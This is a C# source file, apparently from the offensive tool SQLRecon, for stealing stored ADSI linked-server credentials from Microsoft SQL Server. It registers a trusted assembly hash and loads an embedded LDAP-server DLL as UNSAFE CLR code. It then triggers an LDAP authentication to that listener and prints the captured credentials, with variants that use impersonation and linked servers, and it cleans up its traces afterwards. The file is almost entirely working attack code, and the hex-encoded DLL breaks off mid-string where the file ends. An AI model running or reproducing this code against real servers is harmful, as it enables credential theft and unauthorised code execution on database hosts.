﻿using System;
using System.Data.SqlClient;
using System.Threading.Tasks;
using SQLRecon.Utilities;

namespace SQLRecon.Modules
{
    internal class ADSI
    {
        private static readonly AgentJobs _agentJobs = new();
        private static readonly Configure _config = new();
        private static readonly PrintUtils _print = new();
        private static readonly RandomString _rs = new();
        private static readonly SqlQuery _sqlQuery = new();

        /// <summary>
        /// The Standard method loads a .NET assembly, which executes a local LDAP
        /// server on a remote SQL server instance. The LDAP server is started before an
        /// authentication request is sent to it to retrieve stored ADSI credentials.
        /// Reference: https://www.tarlogic.com/blog/linked-servers-adsi-passwords/
        /// </summary>
        /// <param name="con"></param>
        /// <param name="adsiServer"></param>
        /// <param name="port"></param>
        public void Standard(SqlConnection con, string adsiServer, string port)
        {
            // First check to see if clr integration is enabled.
            string sqlOutput = _config.ModuleStatus(con, "clr enabled");

            if (!sqlOutput.Contains("1"))
            {
                _print.Error("You need to enable CLR (enableclr).", true);
                // Go no futher.
                return;
            }

            // Obtain a list of all linked servers.
            sqlOutput = _sqlQuery.ExecuteCustomQuery(con, "SELECT name, product, provider, data_source FROM sys.servers WHERE is_linked = 1;");

            // Check to see if the ADSI server exists in the linked server list.
            if (!sqlOutput.ToLower().Contains(adsiServer.ToLower()))
            {
                _print.Error(String.Format("{0} does not exist.", adsiServer), true);
                // Go no futher.
                return;
            }

            string[] dllArr = _ldapServerAssembly();
            string dllBytes = dllArr[0];
            string dllHash = dllArr[1];

            if (dllHash.Length != 128)
            {
                _print.Error("Unable to calculate hash for DLL.", true);
                // Go no further.
                return;
            }

            // Generate a new random string for the trusted hash path and the CLR function name.
            string dllPath = _rs.Generate(8);
            string assem = "ldapServer";
            string function = _rs.Generate(8);

            // Check to see if the hash already exists.
            sqlOutput = _sqlQuery.ExecuteCustomQuery(con, "SELECT * FROM sys.trusted_assemblies where hash = 0x" + dllHash + ";");

            if (sqlOutput.Contains("System.Byte[]"))
            {
                _print.Status("LDAP server hash already exists in sys.trusted_assemblies. Deleting it before moving forward.", true);
                _sqlQuery.ExecuteQuery(con, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
            }

            // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
            _sqlQuery.ExecuteQuery(con, "EXEC sp_add_trusted_assembly 0x" + dllHash + ",N'" + dllPath +
                    ", version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';");

            // Verify that the SHA-512 hash has been added.
            sqlOutput = _sqlQuery.ExecuteCustomQuery(con, "SELECT * FROM sys.trusted_assemblies;");

            if (sqlOutput.Contains(dllPath))
            {
                _print.Success(string.Format("Added SHA-512 hash for LDAP server assembly to sys.trusted_assemblies with a random name of '{0}'.", dllPath), true);
            }
            else
            {
                _print.Error("Unable to add LDAP server hash to sys.trusted_assemblies.", true);
                // Go no further.
                return;
            }

            // Drop the procedure name, which is the same as the function name if it exists already.
            // Drop the assembly name if it exists already.
            _sqlQuery.ExecuteQuery(con, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
            _sqlQuery.ExecuteQuery(con, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");

            // Create a new custom assembly with the randomly generated name.
            _print.Status(string.Format("Creating a new LDAP server assembly with the name '{0}'.", assem), true);

            _sqlQuery.ExecuteQuery(con, "use msdb; CREATE ASSEMBLY " + assem + " AUTHORIZATION [dbo] FROM 0x" + dllBytes + " WITH PERMISSION_SET = UNSAFE;");

            // Check to see if the LDAP server assembly has been created.
            sqlOutput = _sqlQuery.ExecuteCustomQuery(con, "SELECT * FROM sys.assemblies");

            if (sqlOutput.ToLower().Contains(assem.ToLower()))
            {
                _print.Success(string.Format("Created a new LDAP server assembly with the name '{0}'.", assem), true);
            }
            else
            {
                _print.Error(string.Format("Unable to create a new LDAP server assembly. Cleaning up."), true);
                _sqlQuery.ExecuteQuery(con, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
                _sqlQuery.ExecuteQuery(con, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
                // Go no further.
                return;
            }

            /* Create a CLR runtime routine based on the randomly generated function name.
            * 
            * Interestingly, this query needs to be executed with 'ExecuteNonQuery'
            * as this will execute the query as a block. In MS SQL manager, this command
            * will need to be executed with a GO before it, and a GO after it a
            *'CREATE/ALTER PROCEDURE' must be the first statement in a query batch.
            */
            _print.Status(string.Format("Loading LDAP server assembly into a new CLR runtime routine '{0}'.", function), true);

            try
            {
                SqlCommand query = new(
                "CREATE FUNCTION [dbo]." + function + "(@port int) RETURNS NVARCHAR(MAX) " +
                "AS EXTERNAL NAME " + assem + ".[ldapAssembly.LdapSrv].listen;", con);

                query.ExecuteNonQuery();
            }
            catch (Exception e)
            {
                _print.Error(string.Format("{0}", e), true);
            }

            // Verify that the LDAP server assembly has been created.
            sqlOutput = _sqlQuery.ExecuteCustomQuery(con, "SELECT * FROM sys.assembly_modules");

            if (sqlOutput.ToLower().Contains("ldapsrv"))
            {
                _print.Success(string.Format("Created '[{0}].[ldapAssembly.LdapSrv].[{1}]'.", assem, function), true);
            }
            else
            {
                _print.Error("Unable to load LDAP server assembly into custom CLR runtime routine. Cleaning up.", true);
                _sqlQuery.ExecuteQuery(con, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
                _sqlQuery.ExecuteQuery(con, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
                // Go no futher.
                return;
            }

            _print.Status(string.Format("Starting a local LDAP server on port {0}.", port), true);

            /* Start the LDAP server, which will store the credentias in 'sqlOutput'.
            * This is a long running query that will hang the 'con' connection object until
            * an LDAP connection has been established.
            */
            Task.Run(() =>
                sqlOutput = _sqlQuery.ExecuteCustomQuery(con, "SELECT dbo." + function + "(" + port + ");")
            );

            _print.Status("Executing LDAP solicitation ...", true);

            /* Create a new SQL connection object as we need to have a second
            *  connection to the database.This is because the first
            *  connection object ('con') is being used to run the LDAP server.
            */
            SqlConnection conTwo = SetAuthenticationType.CreateSqlConnectionObject();

            string queryTwo = "SELECT * FROM ''LDAP://localhost:" + port + "'' ";

            // This is not a typo, the query does need to be executed twice in order for the function and assembly to be removed cleanly.
            _sqlQuery.ExecuteLinkedCustomQuery(conTwo, adsiServer, queryTwo);
            _sqlQuery.ExecuteLinkedCustomQuery(conTwo, adsiServer, queryTwo);

            // Check to see if the credentials have been obtained.
            if (_print.IsOutputEmpty(sqlOutput).Contains("No Results"))
            {
                _print.IsOutputEmpty(sqlOutput, true);
            }
            else
            {
                _print.Success(string.Format("Obtained ADSI link credentials.{0}", sqlOutput.Replace("column0", "")), true);
            }

            // Cleaning up.
            _print.Status(string.Format("Cleaning up. Deleting assembly '{0}', function '{1}' and hash from sys.trusted_assembly.", assem, function), true);
            _sqlQuery.ExecuteQuery(conTwo, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
            _sqlQuery.ExecuteQuery(conTwo, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
            _sqlQuery.ExecuteQuery(conTwo, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
        }

        /// <summary>
        /// The Impersonate method loads a .NET assembly, which executes a local LDAP
        /// server on a remote SQL server instance using impersonation. 
        /// The LDAP server is started before an authentication request is 
        /// sent to it to retrieve stored ADSI credentials.
        /// Reference: https://www.tarlogic.com/blog/linked-servers-adsi-passwords/
        /// </summary>
        /// <param name="con"></param>
        /// <param name="adsiServer"></param>
        /// <param name="port"></param>
        /// <param name="impersonate"></param>
        public void Impersonate(SqlConnection con, string adsiServer, string port, string impersonate = "null")
        {
            // First check to see if clr integration is enabled.
            string sqlOutput = _config.ModuleStatus(con, "clr enabled", impersonate);

            if (!sqlOutput.Contains("1"))
            {
                _print.Error("You need to enable CLR (enableclr).", true);
                // Go no futher.
                return;
            }

            // Obtain a list of all linked servers.
            sqlOutput = _sqlQuery.ExecuteImpersonationCustomQuery(con, impersonate, "SELECT name, product, provider, data_source FROM sys.servers WHERE is_linked = 1;");

            // Check to see if the ADSI server exists in the linked server list.
            if (!sqlOutput.ToLower().Contains(adsiServer.ToLower()))
            {
                _print.Error(String.Format("{0} does not exist.", adsiServer), true);
                // Go no futher.
                return;
            }

            string[] dllArr = _ldapServerAssembly();
            string dllBytes = dllArr[0];
            string dllHash = dllArr[1];

            if (dllHash.Length != 128)
            {
                _print.Error("Unable to calculate hash for DLL.", true);
                // Go no further.
                return;
            }

            // Generate a new random string for the trusted hash path and the CLR function name.
            string dllPath = _rs.Generate(8);
            string assem = "ldapServer";
            string function = _rs.Generate(8);

            // Check to see if the hash already exists.
            sqlOutput = _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "SELECT * FROM sys.trusted_assemblies where hash = 0x" + dllHash + "; ");

            if (sqlOutput.Contains("System.Byte[]"))
            {
                _print.Status("LDAP server hash already exists in sys.trusted_assemblies. Deleting it before moving forward.", true);
                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
            }

            // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
            _sqlQuery.ExecuteImpersonationQuery(con, impersonate,
                "EXEC sp_add_trusted_assembly 0x" + dllHash + ",N'" + dllPath +
                 ", version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';");

            // Verify that the SHA-512 hash has been added.
            sqlOutput = _sqlQuery.ExecuteImpersonationCustomQuery(con, impersonate,
                "SELECT * FROM sys.trusted_assemblies;");

            if (sqlOutput.Contains(dllPath))
            {
                _print.Success(string.Format("Added SHA-512 hash for LDAP server assembly to sys.trusted_assemblies with a random name of '{0}'.", dllPath), true);
            }
            else
            {
                _print.Error("Unable to add LDAP server hash to sys.trusted_assemblies.", true);
                // Go no further.
                return;
            }

            // Drop the procedure name, which is the same as the function name if it exists already.
            // Drop the assembly name if it exists already.
            _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
            _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");

            _print.Status(string.Format("Creating a new LDAP server assembly with the name '{0}'.", assem), true);
            _sqlQuery.ExecuteImpersonationQuery(con, impersonate,
                          "use msdb; CREATE ASSEMBLY " + assem + " AUTHORIZATION [dbo] FROM 0x" + dllBytes +
                          " WITH PERMISSION_SET = UNSAFE;");

            // Check to see if the custom assembly has been created
            sqlOutput = _sqlQuery.ExecuteImpersonationQuery(con, impersonate,
               "SELECT * FROM sys.assemblies");

            if (sqlOutput.ToLower().Contains(assem.ToLower()))
            {
                _print.Success(string.Format("Created a new LDAP server assembly with the name '{0}'.", assem), true);
            }
            else
            {
                _print.Error(string.Format("Unable to create a new LDAP server assembly. Cleaning up."), true);
                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
                // Go no further.
                return;
            }


            /* Create a CLR runtime routine based on the randomly generated function name.
            * 
            * Interestingly, this query needs to be executed with 'ExecuteNonQuery'
            * as this will execute the query as a block. In MS SQL manager, this command
            * will need to be executed with a GO before it, and a GO after it a
            *'CREATE/ALTER PROCEDURE' must be the first statement in a query batch.
            */
            _print.Status(string.Format("Loading LDAP server assembly into a new CLR runtime routine '{0}'.", function), true);

            try
            {
                SqlCommand query = new(
                    "EXECUTE AS LOGIN = '" + impersonate + "';", con);

                query.ExecuteNonQuery();

                query = new(
                    "CREATE FUNCTION [dbo]." + function + "(@port int) RETURNS NVARCHAR(MAX) " +
                    "AS EXTERNAL NAME " + assem + ".[ldapAssembly.LdapSrv].listen;", con);

                query.ExecuteNonQuery();
            }
            catch (Exception e)
            {
                _print.Error(string.Format("{0}", e), true);
            }

            // Verify that the LDAP server assembly has been created.

            sqlOutput = _sqlQuery.ExecuteImpersonationCustomQuery(con, impersonate,
                "SELECT * FROM sys.assembly_modules");

            if (sqlOutput.ToLower().Contains("ldapsrv"))
            {
                _print.Success(string.Format("Created '[{0}].[ldapAssembly.LdapSrv].[{1}]'.", assem, function), true);
            }
            else
            {
                _print.Error("Unable to load LDAP server assembly into custom CLR runtime routine. Cleaning up.", true);
                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
                // Go no futher.
                return;
            }

            _print.Status(string.Format("Starting a local LDAP server on port {0}.", port), true);

            /* Start the LDAP server, which will store the credentias in 'sqlOutput'.
            * This is a long running query that will hang the 'con' connection object until
            * an LDAP connection has been established.
            */
            Task.Run(() =>
                sqlOutput = _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "SELECT dbo." + function + "(" + port + ");")
            );

            _print.Status("Executing LDAP solicitation ...", true);

            /* Create a new SQL connection object as we need to have a second
            *  connection to the database.This is because the first
            *  connection object ('con') is being used to run the LDAP server.
            */
            SqlConnection conTwo = SetAuthenticationType.CreateSqlConnectionObject();

            string queryTwo = "select * from openquery(\"" + adsiServer + "\", 'SELECT * FROM ''LDAP://localhost:" + port + "''')";

            // This is not a typo, the query does need to be executed twice in order for the function and assembly to be removed cleanly.
            _sqlQuery.ExecuteImpersonationQuery(conTwo, impersonate, queryTwo);
            _sqlQuery.ExecuteImpersonationQuery(conTwo, impersonate, queryTwo);

            // Check to see if the credentials have been obtained.
            if (_print.IsOutputEmpty(sqlOutput).Contains("No Results"))
            {
                _print.IsOutputEmpty(sqlOutput, true);
            }
            else
            {
                _print.Success(string.Format("Obtained ADSI link credentials.\n{0}", sqlOutput.Replace("column0", "")), true);
            }

            // Cleaning up
            _print.Status(string.Format("Cleaning up. Deleting assembly '{0}', function '{1}' and hash from sys.trusted_assembly.", assem, function), true);
            _sqlQuery.ExecuteImpersonationQuery(conTwo, impersonate, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
            _sqlQuery.ExecuteImpersonationQuery(conTwo, impersonate, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
            _sqlQuery.ExecuteImpersonationQuery(conTwo, impersonate, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
        }

        /// <summary>
        /// The Linked method loads a .NET assembly, which executes a local LDAP
        /// server on a remote link SQL server instance/
        /// The LDAP server is started before an authentication request is 
        /// sent to it to retrieve stored ADSI credentials. The authentication request is sent
        /// using SQL agent jobs.
        /// Reference: https://www.tarlogic.com/blog/linked-servers-adsi-passwords/
        /// </summary>
        /// <param name="con"></param>
        /// <param name="adsiServer"></param>
        /// <param name="port"></param>
        /// <param name="linkedSqlServer"></param>
        /// <param name="sqlServer"></param>
        public void Linked(SqlConnection con, string adsiServer, string port, string linkedSqlServer, string sqlServer)
        {
            // First check to see if rpc is enabled.
            string sqlOutput = _config.ModuleStatus(con, "rpc", "null", linkedSqlServer);

            if (!sqlOutput.Contains("1"))
            {
                _print.Error(string.Format("You need to enable RPC for {1} on {0} (enablerpc -o {1}).",
                    sqlServer, linkedSqlServer), true);
                // Go no futher.
                return;
            }

            // Then check to see if clr integration is enabled.
            sqlOutput = _config.LinkedModuleStatus(con, "clr enabled", linkedSqlServer);

            if (!sqlOutput.Contains("1"))
            {
                _print.Error("You need to enable CLR (lenableclr).", true);
                // Go no futher.
                return;
            }

            string[] dllArr = _ldapServerAssembly();
            string dllBytes = dllArr[0];
            string dllHash = dllArr[1];

            if (dllHash.Length != 128)
            {
                _print.Error("Unable to calculate hash for DLL.", true);
                // Go no further.
                return;
            }

            // Generate a new random string for the trusted hash path and the CLR function name.
            string dllPath = _rs.Generate(8);
            string assem = "ldapServer";
            string function = _rs.Generate(8);

            // Check to see if the hash already exists.
            sqlOutput = _sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer,
                "SELECT * FROM sys.trusted_assemblies where hash = 0x" + dllHash + ";");

            if (sqlOutput.Contains("System.Byte[]"))
            {
                _print.Status("LDAP server hash already exists in sys.trusted_assemblies. Deleting it before moving forward.", true);
                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer,
                    "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
            }

            // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer,
                "EXEC sp_add_trusted_assembly 0x" + dllHash + ",N''" + dllPath +
                    ", version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil'';");

            // Verify that the SHA-512 hash has been added.
            sqlOutput = _sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer,
                "SELECT * FROM sys.trusted_assemblies;");

            if (sqlOutput.Contains(dllPath))
            {
                _print.Success(string.Format("Added SHA-512 hash for LDAP server assembly to sys.trusted_assemblies with a random name of '{0}'.", dllPath), true);
            }
            else
            {
                _print.Error("Unable to add LDAP server hash to sys.trusted_assemblies.", true);
                // Go no further.
                return;
            }

            // Drop the procedure name, which is the same as the function name if it exists already.
            // Drop the assembly name if it exists already.
            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");

            // Create a new custom assembly with the randomly generated name.
            _print.Status(string.Format("Creating a new LDAP server assembly with the name '{0}'.", assem), true);

            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer,
                "CREATE ASSEMBLY " + assem + " AUTHORIZATION [dbo] FROM 0x" + dllBytes +
                          " WITH PERMISSION_SET = UNSAFE;");

            // Check to see if the custom assembly has been created
            sqlOutput = _sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer,
                "SELECT * FROM sys.assemblies;");

            if (sqlOutput.ToLower().Contains(assem.ToLower()))
            {
                _print.Success(string.Format("Created a new LDAP server assembly with the name '{0}'.", assem), true);
            }
            else
            {
                _print.Error(string.Format("Unable to create a new LDAP server assembly. Cleaning up."), true);
                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
                // Go no further.
                return;
            }

            /* Create a CLR runtime routine based on the randomly generated function name.
             * 
             * Interestingly, this query needs to be executed with 'ExecuteNonQuery'
             * as this will execute the query as a block. In MS SQL manager, this command
             * will need to be executed with a GO before it, and a GO after it a
             *'CREATE/ALTER PROCEDURE' must be the first statement in a query batch.
             */

            _print.Status(string.Format("Loading LDAP server assembly into a new CLR runtime routine '{0}'.", function), true);

            try
            {
                SqlCommand query = new("EXECUTE ('" +
                    "CREATE FUNCTION [dbo]." + function + "(@port int) RETURNS NVARCHAR(MAX) " +
                    "AS EXTERNAL NAME " + assem + ".[ldapAssembly.LdapSrv].listen;" +
                    "') AT " + linkedSqlServer + ";", con);

                query.ExecuteNonQuery();
            }
            catch (Exception e)
            {
                _print.Error(string.Format("{0}", e), true);
            }

            // Verify that the LDAP server assembly has been created.
            sqlOutput = _sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer,
                "SELECT * FROM sys.assembly_modules");

            if (sqlOutput.ToLower().Contains("ldapsrv"))
            {
                _print.Success(string.Format("Created '[{0}].[ldapAssembly.LdapSrv].[{1}]'.", assem, function), true);
            }
            else
            {
                _print.Error("Unable to load LDAP server assembly into custom CLR runtime routine. Cleaning up.", true);
                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
                // Go no futher.
                return;

            }

            _print.Status(string.Format("Starting a local LDAP server on port {0}.", port), true);

            /* Start the LDAP server, which will store the credentias in 'sqlOutput'.
            * This is a long running query that will hang the 'con' connection object until
            * an LDAP connection has been established.
            */
            Task.Run(() =>
                sqlOutput = _sqlQuery.ExecuteLinkedQuery(con, linkedSqlServer, "SELECT dbo." + function + "(" + port + ");")
            );

            _print.Status("Executing LDAP solicitation using SQL agent jobs...", true);

            /* Create a new SQL connection object as we need to have a second
            *  connection to the database.This is because the first
            *  connection object ('con') is being used to run the LDAP server.
            */
            SqlConnection conTwo = SetAuthenticationType.CreateSqlConnectionObject();

            /* At this point, we can send a SQL query which will send a request to the local LDAP server.
             * This is tricky as it requires one of two methods: 
             * - EXECUTE - which requires RPC to be enabled on the secondary link server. 
             * - OpenQuery within an OpenQuery - which doesn't work.
             * 
             * Based on this, a nice work around is to leverage the SQL agent on the remote linked server
             * to queue up an OpenQuery that we can use to execute on the linked server, against the ADSI server.
             */

            _agentJobs.Linked(conTwo, linkedSqlServer, "TSQL",
                "SELECT * FROM OpenQuery( " + adsiServer + ", '''' SELECT * FROM ''''''''LDAP://localhost:" + port + "'''''''' '''');"
                , sqlServer);

            // Check to see if the credentials have been obtained.
            if (_print.IsOutputEmpty(sqlOutput).Contains("No Results"))
            {
                _print.IsOutputEmpty(sqlOutput, true);
            }
            else
            {
                _print.Success(string.Format("Obtained ADSI link credentials.\n{0}", sqlOutput.Replace("column0", "")), true);
            }

            // Cleaning up.
            _print.Status(string.Format("Cleaning up. Deleting assembly '{0}', function '{1}' and hash from sys.trusted_assembly.", assem, function), true);
            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(conTwo, linkedSqlServer, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(conTwo, linkedSqlServer, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(conTwo, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
        }

        /// <summary>
        /// The _ldapServerAssembly function contains the .NET assembly for an LDAP server
        /// in SQL byte format, as well as the SHA-512 hash for the assembly.
        /// The code can be found here: https://github.com/blackarrowsec/redteam-research/blob/master/MSSQL%20linked%20servers%20-%20ADSI/ldapServer.cs
        /// </summary>
        /// <returns></returns>
        private string[] _ldapServerAssembly()
        {
            string[] dllArr = new string[2];

            // This is the .NET assembly for an LDAP server in SQL byte format.
            dllArr[0] = "4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300265F83640000000000000000E00002210B010B00002A000000060000000000001E49000000200000006000000000001000200000000200000400000000000000040000000000000000A000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000D04800004B00000000600000B002000000000000000000000000000000000000008000000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E746578740000002429000000200000002A000000020000000000000000000000000000200000602E72737263000000B00200000060000000040000002C0000000000000000000000000000400000402E72656C6F6300000C000000008000000002000000300000000000000000000000000000400000420000000000000000000000000000000000490000000000004800000002000500A02D0000301B00000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000133001002000000001000011026F190000060B1201280500000A2D091201280600000A2B0116000A2B00062A133001002000000001000011026F190000060B1201280500000A2D091201280600000A2B0116000A2B00062A1B30030002010000020000110072010000700A007E0700000A02730800000A0B076F0900000A00076F0A00000A0C086F0B00000A0D7203000070130572030000701306091204282B0000062611047B410000047E010000042D1314FE0602000006730C00000A80010000042B007E01000004280100002B16FE01130A110A2D570011047B410000047E020000042D1314FE0603000006730C00000A80020000042B007E02000004280200002B130711077B41000004176F0F00000A6F0300002B130511077B41000004186F0F00000A6F0300002B130600086F1000000A00076F1100000A00721700007011051106281200000A0A00DE0E13080011086F1300000A0A00DE00000613092B0011092A00000110000000000700E4EB000E13000001133005005D00000003000011000316FE01130411042D140002722700007072010000706F1400000A100000026F1500000A0A06185B8D140000010B160C2B1A000708185B0208186F1600000A1F10281700000A9C000818580C0806FE04130411042DDC070D2B00092A00000013300300500000000400001100028E69185A731800000A0A00020D1613042B24091104910B0006722B000070078C14000001281900000A6F1A00000A26001104175813041104098E69FE04130511052DCF066F1300000A0C2B00082A1B300200890000000500001100170A72010000700B00026F1B00000A13042B3D11046F1C00000A0C000708281D00000A8C18000001281E00000A0B061E5D16FE0116FE01130511052D0E00077227000070281F00000A0B000617580A0011046F2000000A130511052DB6DE1D110475190000011306110614FE01130511052D0811066F2100000A00DC00076F2200000A0D2B00092A00000001100000020012004E60001D00000000133005007E0000000600001100021F7FFE02130511052D1500178D14000001130611061602D29C110613042B5A0002282300000A0A068E69D20B2B1800071759D20B060717599116FE01130511052D03002B0E000716FE0416FE01130511052DDB072080000000580C1707588D140000010D091608D29C0616091707282400000A000913042B0011042A0000133005005D0000000700001100041754160A0203911D6317FE0116FE01130411042D37000203911F7F5F0B1A8D140000010C02031758081607282400000A0008280400002B280500002B16282700000A0A04254A075854002B09000203911F7F5F0A00060D2B00092A000000133004006D0000000800001100031754160A178D140000010B020716176F2800000A260716911D6317FE0116FE01130511052D34000716911F7F5F0C088D140000010D020916086F2800000A2609280400002B280500002B16282700000A0A03254A085854002B09000716911F7F5F0A000613042B0011042A000000133002001200000009000011000203280600002B282A00000A0A2B00062A0000133001000B0000000A000011027B3E0000040A2B00062A2202037D3E0000042A13300300220000000B00001100178D140000010B071602280B0000069C07732B00000A1B282C00000A0A2B00062A0000133002000E0000000C0000110002280B0000061C630A2B00062A0000133002000F0000000D0000110002280B0000061F1F5F0A2B00062A00133002000F0000000E0000110002280B0000061F1F5F0A2B00062A0013300200100000000A0000110002280B0000061F1F5FD20A2B00062A8202282D00000A00000203D204282E00000A1B62581F4058D2280C00000600002A7602282D00000A00000203D204282E00000A1B6258D2280C00000600002A8A02282D00000A0000020304282E00000A1B6258208000000058D2280C00000600002A0000133001000C0000000F000011000273160000060A2B00062A4A02282D00000A00000203280C00000600002A0013300100110000000C00001100027B3F0000046F0E0000060A2B00062A00000013300100110000001000001100027B3F0000046F0D0000060A2B00062A00000013300200380000001100001100027B3F0000046F0E00000617FE0116FE010B072D1400027B3F0000046F10000006732F00000A0A2B0C1202FE150100001B080A2B00062A13300200380000001200001100027B3F0000046F0E00000616FE0116FE010B072D1400027B3F0000046F0F000006733000000A0A2B0C1202FE150400001B080A2B00062A13300200380000001300001100027B3F0000046F0E00000618FE0116FE010B072D1400027B3F0000046F11000006733100000A0A2B0C1202FE150500001B080A2B00062ABA02168D140000017D4000000402733200000A7D4100000402282D00000A000002030473120000067D3F000004002AEE02168D140000017D4000000402733200000A7D4100000402282D00000A000002030473120000067D3F00000402020528260000067D40000004002ABA02168D140000017D4000000402733200000A7D4100000402282D00000A000002030473130000067D3F000004002AEE02168D140000017D4000000402733200000A7D4100000402282D00000A000002030473130000067D3F00000402020528260000067D40000004002ABA02168D140000017D4000000402733200000A7D4100000402282D00000A000002030473140000067D3F000004002AEE02168D140000017D4000000402733200000A7D4100000402282D00000A000002030473140000067D3F00000402020528260000067D40000004002AA202168D140000017D4000000402733200000A7D4100000402282D00000A000002037D3F000004002A1E02282D00000A2A4E027B42000004036F230000066F3300000A002A000013300500CD00000014000011140C732D0000060D0009733400000A7D42000004027B3F0000046F0D00000616FE01130511052D2300027B41000004082D0F09FE062E000006733500000A0C2B00086F3600000A00002B1400097B42000004027B400000046F3300000A0000097B420000046F3700000A28070000060A17068E6958097B420000046F3700000A588D140000010B0716027B3F0000046F0B0000069C06160717068E69282400000A00097B420000046F3800000A160717068E6958097B420000046F3700000A282400000A000713042B0011042A00000013300200200000001500001100022825000006D00800001B283900000A283A00000AA50800001B0A2B00062A13300500D90000001600001100027B3F0000046F0E00000616FE0116FE010C083AA100000000027B3F0000046F0F00000617FE0116FE010C082D1800027B4000000416283B00000A8C200000010B3890000000027B3F0000046F0F00000618FE0116FE010C082D41001A8D140000010A027B4000000416061A027B400000048E6959027B400000048E69282400000A0006280400002B280500002B16282700000A8C180000010B2B3A00283C00000A027B4000000416027B400000048E696F3D00000A0B2B1D00283C00000A027B4000000416027B400000048E696F3D00000A0B2B00072A00000013300300060100001700001100036F3E00000AD012000001283900000A283F00000A16FE010B072D1700283C00000A0374120000016F4000000A0A38D0000000036F3E00000AD018000001283900000A283F00000A16FE010B072D1C0003A518000001282300000A280400002B280500002B0A3898000000036F3E00000AD020000001283900000A283F00000A16FE010B072D0F0003A520000001284100000A0A2B6D036F3E00000AD014000001283900000A283F00000A16FE010B072D1500178D140000010C081603A5140000019C080A2B3C036F3E00000AD00900001B283900000A283F00000A16FE010B072D0A0003740900001B0A2B167239000070036F3E00000A281900000A734200000A7A062A000013300200170000001800001100027B41000004166F0F00000A6F0700002B0A2B00062A9A021F1017281E0000060000027B410000041816038C18000001731F0000066F4300000A00002A2E020328220000060000002A00001330040032000000190000110002169128150000060A160B0217120128080000060C02160807581758282C000006166F0F00000A74090000020D2B00092A00001B300400810000001A0000110000178D140000010A020616176F2800000A0B0716FE01130711072D4F0006169128150000060C160D0212032809000006130411048D1400000113050211051611046F2800000A26030873290000065103507B410000041105161104282C0000066F4400000A00171306DE1100DE05260000DE0